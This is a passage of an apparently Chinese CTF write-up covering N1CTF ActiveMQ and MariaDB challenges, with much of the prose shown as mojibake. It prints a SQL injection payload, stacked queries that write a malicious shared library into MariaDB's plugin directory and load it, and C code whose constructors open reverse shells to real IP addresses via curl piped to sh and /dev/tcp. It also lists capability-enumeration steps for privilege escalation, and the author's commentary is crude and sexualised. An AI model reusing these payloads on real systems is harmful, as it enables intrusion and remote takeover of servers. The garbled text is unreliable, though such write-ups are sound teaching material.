Main</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;</span>,<span class="string">&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>wcsndm,æœ¬åœ°ç¯å¢ƒbase64tmdå†™ä¸äº†æ–‡ä»¶ğŸ˜…,âˆšâ…§ssrfå‘½ä»¤æ‰§è¡Œä¹Ÿå°½æ¶å¿ƒäºº,é¢˜ç›®è¿˜ä¸ç»™ç¼–è¯‘,ä½ tmjavaä¸ç”¨ç¼–è¯‘æ˜¯å§ğŸ˜“ğŸ˜…,æ‰‹</p><p>æ“classæ–‡ä»¶æ˜¯å§.</p><p>å“¦,æºèµ–æ°java11ç¼–è¯‘å’Œè¿è¡Œä¸€ä½“åŒ–,ä¸€ä¸ªjavaå°±èƒ½æå®š,nmsl(é‚£æ²¡äº‹äº†)ğŸ˜Š</p><p>ä¹‹åè°ƒç”¨comsumeå‡½æ•°å°±è¡Œ,ç”±äºflagå·²ç»å†™å…¥é˜Ÿåˆ—äº†,è¯»é˜Ÿåˆ—å°±è¡Œäº†.ğŸ¤£</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699428078871.png" alt="1699428078871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">         main.consume();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://target:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">subSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> subSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageConsumer</span> <span class="variable">subscriber</span> <span class="operator">=</span> subSession.createConsumer(queue);</span><br><span class="line">        subscriber.setMessageListener(<span class="built_in">this</span>);</span><br><span class="line">        connection.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>MessageConsumer subscriber = subSession.createConsumer(queue);</code>ï¼šä½¿ç”¨ <code>Session</code> åˆ›å»ºä¸€ä¸ª <code>MessageConsumer</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç”¨äºæ¥æ”¶é˜Ÿåˆ— <code>flagqueue</code> ä¸Šçš„æ¶ˆæ¯ã€‚</p><p>ä¸€ä¸ªå¾·æ‹‰ç±³,ä½ è®¾è®¡ç‰›é­”çš„âˆšâ…§é¢˜å‘¢,çº¯ğŸ˜…æ¶å¿ƒäºº,å¤ç°éƒ½ä¸è®©äº†ğŸ‘´å®‰å®.è¿˜å¥½ğŸ‘´æ˜¯å®Œç¾å¤©æ‰çš„idol(æš´è®ºğŸ˜¡)</p><p>æ³¨æ„ç±³çº¿<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/cc4c3cec08fa513d70d1c712786d55fbb0fbd9c3.jpg" alt="cc4c3cec08fa513d70d1c712786d55fbb0fbd9c3"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/ee8b339371cb6287bdb73d2f1d82c482d5a25b5c.jpg" alt="ee8b339371cb6287bdb73d2f1d82c482d5a25b5c"></p><h1 id="ez_maria"><span id="ez_maria"> ez_maria</span></h1><p>å¥½å¯çˆ±çš„lolitağŸ¥µğŸ¥µ,ä¸çŸ¥é“n1éƒ½æ€ä¹ˆå¿ä½çš„,æ˜¯æˆ‘ç›´æ¥â€¦ç‹ ç‹ åœ°æŠŠè¿™é¢˜åšå‡ºæ¥,è™½ç„¶ä¹Ÿä¸ä¸€å®šèƒ½åšå‡ºæ¥å°±æ˜¯äº†.ğŸ˜¤</p><p>ä¸Šæ¥å°±å‘Šè¯‰ä½ æœ‰SQLçš„åˆ©ç”¨ç‚¹,ä¸å¤šè¯´,ç›´æ¥ç‹ ç‹ åœ°æç‚¹äº‹.</p><p>äºŒè¯ä¸è¯´,æ‰“ä¸ªç»çº¿(è¯»ä¸ªindex.php)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span> union select <span class="number">1</span>, load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="æºç åˆ†æ"><span id="æºç åˆ†æ"> æºç åˆ†æ</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//for n1ctf ezmariadb secret cmd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&quot;secret&quot;</span>] === <span class="string">&quot;lolita_love_you_forever&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ps -ef` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ps -ef&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /var/www/html/` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /var/www/html/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`find /mysql` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;find /mysql&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;can you get shell?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbn</span> = <span class="string">&quot;ctf&quot;</span>;</span><br></pre></td></tr></table></figure><p>waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“<code>secret=lolita_love_you_forever</code>æ—¶,ä¼šçˆ†å‡ºä¸€äº›ä¿¡æ¯.</p><p>lolitaçœŸçš„ä¼šçˆ±æˆ‘å—,æˆ‘å·²ç»å•èº«äºŒåå¹´ç”šè‡³åä¹å¹´,lolitaçˆ±æˆ‘çš„è¯,å°ğŸš¹ğŸ‘©â€ğŸ¦°ä¹Ÿä¸æ˜¯ä¸è¡Œâ€¦(ä¸è¡Œ,ğŸ‘´æ°¸è¿œå–œæ¬¢æ —å±±æœªæ¥)</p><p>ä¼ å‚,è·å–ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql</span><br></pre></td></tr></table></figure><p>pluginç›®å½•æ˜¯<code>/mysql/plugin</code>,<code>secure-file-priv</code>æ˜¯ç©ºçš„,è¿™è¡¨ç¤º MySQL å…è®¸ä»ä»»ä½•ä½ç½®è¯»å–æ•°æ®æ–‡ä»¶ã€‚</p><p>ãªã‚‰ã°ã€ç­”ãˆã¯ã²ã¨ã¤ã .(bushi)</p><p>å¾€ /mysql/plugin ç›®å½•å†™ so æ‰“ udfğŸ˜Š,è™½ç„¶functionè¢«ban,ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰INSTALL</p><h2 id="udfå†™so"><span id="udfå†™so"> UDFå†™soğŸ¤ª</span></h2><p>å†™æ³•ä¸€:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span>((constructor)) <span class="keyword">void</span> <span class="title function_ invoke__">init</span>(<span class="keyword">int</span> argc, char *argv[]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://reverse-shell.sh/82.156.5.200:1034 | sh &amp;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™æ³•äºŒ:æ¥è‡ªLolitaçš„â¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">lshell</span>()&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1 &amp;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOLITA</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="title function_ invoke__">LOLITA</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">LOLITA lolita;</span><br><span class="line">LOLITA* _mysql_plugin_interface_version_ = &amp;lolita;</span><br><span class="line"><span class="comment">//compile: g++ expso.cpp -shared -fPIC -o exp.so</span></span><br></pre></td></tr></table></figure><p>ä»¥åŠæ¥è‡ªDJBçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc</span><br></pre></td></tr></table></figure><p>-nostartfiles -nolibcè¿™ä¸¤ä¸ªé€‰é¡¹æ¯”è¾ƒé«˜çº§,åµŒå…¥å¼ç³»ç»Ÿå¸¸ä½¿ç”¨</p><p>å†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="title function_ invoke__">open</span>(<span class="string">&quot;preaload.so&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">xid = <span class="string">&quot;1; select unhex(&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="string">&#x27;%02X&#x27;</span> % b <span class="keyword">for</span> b in <span class="title function_ invoke__">bytes</span>(f.<span class="title function_ invoke__">read</span>())]) + <span class="string">&quot;&#x27;) into dumpfile &#x27;/mysql/plugin/lolita.so&#x27;;&quot;</span></span><br><span class="line">res = requests.<span class="title function_ invoke__">post</span>(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: xid</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>æˆ–è€…NESEå¤§çˆ¹çš„å†™æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; select <span class="title function_ invoke__">from_base64</span>(<span class="string">&#x27;xx&#x27;</span>) into dumpfile <span class="string">&#x27;/mysql/plugin/xxx.so&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><code>%</code>ï¼šè¡¨ç¤ºæ ¼å¼è¯´æ˜ç¬¦çš„èµ·å§‹ã€‚</li><li><code>0</code>ï¼šè¡¨ç¤ºä½¿ç”¨é›¶æ¥å¡«å……å­—æ®µå®½åº¦ï¼Œå¦‚æœè½¬æ¢çš„å€¼ä¸è¶³æŒ‡å®šçš„å®½åº¦ã€‚</li><li><code>2</code>ï¼šè¡¨ç¤ºå­—æ®µçš„æœ€å°å®½åº¦ï¼Œå³è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­è‡³å°‘ä¼šæœ‰ä¸¤ä¸ªå­—ç¬¦ã€‚</li><li><code>X</code>ï¼šè¡¨ç¤ºè¦å°†æ•´æ•°ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºï¼Œå¹¶ä¸”ä½¿ç”¨å¤§å†™å­—æ¯ã€‚</li></ul><p>å†™è¿›å»è¿˜æ²¡å®Œ,ç”±äºæ²¡æœ‰mysqlåº“,å¾—å…ˆåˆ›é€ ä¸ªmysqlåº“,ğŸ‘´çœŸæ˜¯å¤ªèœäº†,ğŸ‘´è¦å­¦!!!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS mysql;</span><br><span class="line"><span class="keyword">use</span> <span class="title">mysql</span>;</span><br><span class="line">CREATE TABLE IF NOT EXISTS <span class="title function_ invoke__">plugin</span> ( name <span class="title function_ invoke__">varchar</span>(<span class="number">64</span>) DEFAULT <span class="string">&#x27;&#x27;</span> NOT <span class="literal">NULL</span>, dl <span class="title function_ invoke__">varchar</span>(<span class="number">128</span>) DEFAULT <span class="string">&#x27;&#x27;</span> NOT <span class="literal">NULL</span>, PRIMARY <span class="title function_ invoke__">KEY</span> (name) ) engine=Aria transactional=<span class="number">1</span> CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=<span class="string">&#x27;MySQL plugins&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;create database mysql;create table mysql.<span class="title function_ invoke__">plugin</span>(name <span class="title function_ invoke__">varchar</span>(<span class="number">64</span>), dl <span class="title function_ invoke__">varchar</span>(<span class="number">128</span>));INSTALL PLUGIN testx SONAME <span class="string">&#x27;lolita.so&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><code>CREATE TABLE IF NOT EXISTS plugin</code>: è¿™éƒ¨åˆ†å¼€å§‹äº†ä¸€ä¸ªåˆ›å»ºè¡¨çš„ SQL è¯­å¥ã€‚<code>IF NOT EXISTS</code> éƒ¨åˆ†è¡¨ç¤ºå¦‚æœåŒåçš„è¡¨å·²ç»å­˜åœ¨ï¼Œå°±ä¸å†åˆ›å»ºï¼Œä»¥é¿å…é‡å¤åˆ›å»ºã€‚</p></li><li><p><code>( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL)</code>: è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†è¡¨çš„åˆ—ã€‚å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li><code>name varchar(64)</code>: åˆ›å»ºä¸€ä¸ªåä¸º â€œnameâ€ çš„åˆ—ï¼Œå…¶æ•°æ®ç±»å‹ä¸º VARCHARï¼Œæœ€å¤§é•¿åº¦ä¸º 64 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªåˆ—å­˜å‚¨æ’ä»¶çš„åç§°ã€‚</li><li><code>dl varchar(128)</code>: åˆ›å»ºä¸€ä¸ªåä¸º â€œdlâ€ çš„åˆ—ï¼Œå…¶æ•°æ®ç±»å‹ä¸º VARCHARï¼Œæœ€å¤§é•¿åº¦ä¸º 128 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªåˆ—å­˜å‚¨æ’ä»¶çš„ä¸‹è½½é“¾æ¥ã€‚</li><li><code>DEFAULT ''</code>: è¿™éƒ¨åˆ†æŒ‡å®šäº†å¦‚æœæ²¡æœ‰æä¾›å€¼ï¼Œè¿™ä¸¤ä¸ªåˆ—çš„é»˜è®¤å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚</li><li><code>NOT NULL</code>: è¿™éƒ¨åˆ†æŒ‡å®šäº†è¿™ä¸¤åˆ—æ˜¯éç©ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ’å…¥æ•°æ®æ—¶å¿…é¡»ä¸ºå®ƒä»¬æä¾›å€¼ã€‚</li></ul></li><li><p><code>PRIMARY KEY (name)</code>: è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†ä¸€ä¸ªä¸»é”®çº¦æŸã€‚å®ƒæŒ‡å®š â€œnameâ€ åˆ—ä½œä¸ºä¸»é”®ï¼Œè¿™æ„å‘³ç€ â€œnameâ€ åˆ—ä¸­çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†æ¯ä¸ªæ’ä»¶ã€‚</p></li><li><p><code>engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci</code>: è¿™éƒ¨åˆ†å®šä¹‰äº†è¡¨çš„å¼•æ“ã€äº‹åŠ¡æ€§ã€å­—ç¬¦é›†å’Œæ’åºè§„åˆ™ã€‚</p><ul><li><code>engine=Aria</code>: è¡¨ä½¿ç”¨ Aria å­˜å‚¨å¼•æ“ã€‚</li><li><code>transactional=1</code>: è¡¨è¢«æŒ‡å®šä¸ºäº‹åŠ¡æ€§è¡¨ã€‚</li><li><code>CHARACTER SET utf8mb3</code>: è¡¨çš„å­—ç¬¦é›†è¢«è®¾ç½®ä¸º UTF-8 MB3ã€‚</li><li><code>COLLATE utf8mb3_general_ci</code>: è¡¨çš„æ’åºè§„åˆ™è¢«è®¾ç½®ä¸º UTF-8 MB3 çš„é€šç”¨ä¸åŒºåˆ†å¤§å°å†™æ’åºè§„åˆ™ã€‚</li></ul></li><li><p><code>comment='MySQL plugins'</code>: è¿™ä¸€éƒ¨åˆ†å¯ä»¥ç”¨äºæä¾›è¡¨çš„æ³¨é‡Šæˆ–æè¿°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¡¨çš„æ³¨é‡Šæ˜¯ â€œMySQL pluginsâ€ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£è¡¨çš„ç”¨é€”ã€‚</p><p>ğŸ‘´ç»™ä½ è¯¦ç»†åœ°ä»‹ç»ä¸€ä¸‹æ€ä¹ˆä¸ªäº‹,ç®—æ˜¯ä»‹ç»ä¸€ä¸ªå»ºè¡¨æ¨¡æ¿äº†,é¿å…ä»¥åå»ºè¡¨å‡ºbug.</p></li></ol><p>æ¥ä¸‹æ¥åŠ è½½æ¶æ„soæ–‡ä»¶,å¼¹shellæˆåŠŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;INSTALL PLUGIN lolita SONAME <span class="string">&#x27;lolita.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699444663266.png" alt="1699444663266"></p><p>ç„¶è€Œè¿™å¯å¹¶ä¸æ˜¯ç»ˆç‚¹,é˜¿ç±³è¯ºæ–¯,flagæ²¡æƒé™è¯»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec getcap &#123;&#125; ; <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure><p>å¯¹æ¯ä¸ªæ–‡ä»¶è¿è¡Œ <code>getcap</code> å‘½ä»¤ï¼Œä»¥æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦æ‹¥æœ‰&quot;capabilities&quot;å±æ€§ã€‚è€Œ <code>-exec</code> éƒ¨åˆ†æ˜¯ç”¨äºæ‰§è¡Œè¿™ä¸ªæ£€æŸ¥çš„å‘½ä»¤,<code>&#123;&#125;</code>æ˜¯å ä½ç¬¦</p><p><code>getcap</code>æ˜¯Linuxå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ£€æŸ¥å’Œæ˜¾ç¤ºæ–‡ä»¶çš„&quot;capabilities&quot;ã€‚å®ƒå…è®¸ä½ æŸ¥çœ‹ä¸ç‰¹å®šæ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶ç›¸å…³è”çš„&quot;capabilities&quot;</p><h2 id="ç‰›é­”çš„ä»€ä¹ˆäº‹capabilitiesæƒé™"><span id="ç‰›é­”çš„ä»€ä¹ˆäº‹capabilitiesæƒé™"> ç‰›é­”çš„ä»€ä¹ˆäº‹capabilitiesæƒé™ğŸ˜“</span></h2><p><a href="https://blog.csdn.net/xdy762024688/article/details/132237969">linux setcapå‘½ä»¤è¯¦è§£(åŒ…æ‹¬å„ä¸ªcapçš„ä½¿ç”¨ä¸¾ä¾‹)_xiedy001çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.freebuf.com/articles/system/358115.html">Linuxææƒä¹‹Capabilitiesææƒï¼ˆä¸€ï¼‰ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>æ¥è‡ªlolitaå°æ”¹æ”¹(bushi)çš„â¤</p><p>&quot;capabilities&quot;æƒé™æ˜¯Linuxå†…æ ¸å¼•å…¥çš„ï¼Œç”¨äºç²¾ç»†åˆ’åˆ†è¶…çº§ç”¨æˆ·æƒé™çš„é¢†åŸŸ</p><p>è¯´ç™½äº†,rootè¢«åˆ†æƒäº†,capabilitiesç»§æ‰¿ä¸€éƒ¨åˆ†.</p><ol><li><code>CAP_NET_BIND_SERVICE</code>ï¼šå…è®¸ç»‘å®šå°äº1024çš„ç½‘ç»œç«¯å£ã€‚</li><li><code>CAP_SYS_ADMIN</code>ï¼šå…è®¸æ‰§è¡Œä¸€äº›ç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚</li><li><code>CAP_DAC_OVERRIDE</code>ï¼šå…è®¸å¿½ç•¥æ–‡ä»¶çš„ä¼ ç»ŸUnixæƒé™ã€‚</li><li><code>CAP_SYS_PTRACE</code>ï¼šå…è®¸è·Ÿè¸ªå…¶ä»–è¿›ç¨‹ã€‚</li><li><code>CAP_SETUID</code>ï¼šå…è®¸è¿›ç¨‹æ”¹å˜å…¶æœ‰æ•ˆç”¨æˆ·IDã€‚</li></ol><table><thead><tr><th style="text-align:center">capabilityåç§°</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">CAPAUDITCONTROL</td><td style="text-align:center">å¯ç”¨å’Œç¦ç”¨å†…æ ¸å®¡è®¡ï¼›æ”¹å˜å®¡è®¡è¿‡æ»¤è§„åˆ™ï¼›æ£€ç´¢å®¡è®¡çŠ¶æ€å’Œè¿‡æ»¤è§„åˆ™</td></tr><tr><td style="text-align:center">CAPAUDITREAD</td><td style="text-align:center">å…è®¸é€šè¿‡ multicast netlink å¥—æ¥å­—è¯»å–å®¡è®¡æ—¥å¿—</td></tr><tr><td style="text-align:center">CAPAUDITWRITE</td><td style="text-align:center">å°†è®°å½•å†™å…¥å†…æ ¸å®¡è®¡æ—¥å¿—</td></tr><tr><td style="text-align:center">CAPBLOCKSUSPEND</td><td style="text-align:center">ä½¿ç”¨å¯ä»¥é˜»æ­¢ç³»ç»ŸæŒ‚èµ·çš„ç‰¹æ€§</td></tr><tr><td style="text-align:center">CAP_CHOWN</td><td style="text-align:center">ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</td></tr><tr><td style="text-align:center">CAPDACOVERRIDE</td><td style="text-align:center">å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶</td></tr><tr><td style="text-align:center">CAP_DAC_READ_SEARCH</td><td style="text-align:center">å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„ DAC è®¿é—®é™åˆ¶</td></tr><tr><td style="text-align:center">CAP_FOWNER</td><td style="text-align:center">å¿½ç•¥æ–‡ä»¶å±ä¸» ID å¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ· ID ç›¸åŒ¹é…çš„é™åˆ¶</td></tr><tr><td style="text-align:center">CAP_FSETID</td><td style="text-align:center">å…è®¸è®¾ç½®æ–‡ä»¶çš„ setuid ä½</td></tr><tr><td style="text-align:center">CAPIPCLOCK</td><td style="text-align:center">å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ</td></tr><tr><td style="text-align:center">CAPIPCOWNER</td><td style="text-align:center">å¿½ç•¥ IPC æ‰€æœ‰æƒæ£€æŸ¥</td></tr><tr><td style="text-align:center">CAP_KILL</td><td style="text-align:center">å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å·</td></tr><tr><td style="text-align:center">CAP_LEASE</td><td style="text-align:center">å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„ FL_LEASE æ ‡å¿—</td></tr><tr><td style="text-align:center">CAPLINUXIMMUTABLE</td><td 